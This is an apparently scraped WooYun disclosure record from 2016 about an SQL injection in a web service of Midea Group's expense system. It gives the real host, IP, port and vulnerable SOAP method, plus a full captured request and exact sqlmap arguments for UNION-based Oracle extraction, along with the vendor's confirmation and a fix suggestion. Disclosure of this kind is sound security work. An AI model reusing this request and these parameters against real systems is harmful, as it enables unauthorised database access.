{"id": 86628, "wybug_id": "wooyun-2016-0181880", "wybug_title": "美的集团某系统SQL注入漏洞", "wybug_corp": "midea.com", "wybug_author": "peer", "wybug_date": "2016-03-07 16:48", "wybug_open_date": "2016-04-21 16:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入", "请求"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-03-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-04-21：\t细节向公众公开  简要描述： 美的某系统的SQL注入 详细说明：  http://jders.midea.com.cn/ 美的集团网上报帐系统在8001端口存在一个WebService接口：http://jders.midea.com.cn:8001/ERSService.asmx?WSDL其中的searchUser方法存在注入（其它方法也存在注入，只使用这个方法去测试了）\n\n\n\n使用BurpSuite拦包测试（使用CDATA来保证请求不需要转义）：\n\n将数据包复制到txt文件注入位置加个“*”号，使用sqlmap跑下：数据包：\nPOST /ERSService.asmx HTTP/1.1Accept-Encoding: gzip,deflateContent-Type: text/xml;charset=UTF-8SOAPAction: \"http://tempuri.org/searchUsers\"Content-Length: 434Host: 202.104.30.149:8001User-Agent: Apache-HttpClient/4.1.1 (java 1.5)<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">   <soapenv:Header/>   <soapenv:Body>      <tem:searchUsers>         <!--Optional:-->         <tem:pt_id><![CDATA[1*]]></tem:pt_id>         <!--Optional:-->         <tem:username>aaaa</tem:username>      </tem:searchUsers>   </soapenv:Body></soapenv:Envelope>\nSQLMap参数：\n-r C:/a.txt --technique=U --dbms=oracle --union-cols=\"2\" --prefix=\"'\" --suffix=\"--\" --current-user --current-db --banner\n\n\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  过滤所有接口获取的参数或接口添加权限访问   版权声明：转载请注明来源 peer@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-03-07 16:49 厂商回复： 确认漏洞存在，修修补补去。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}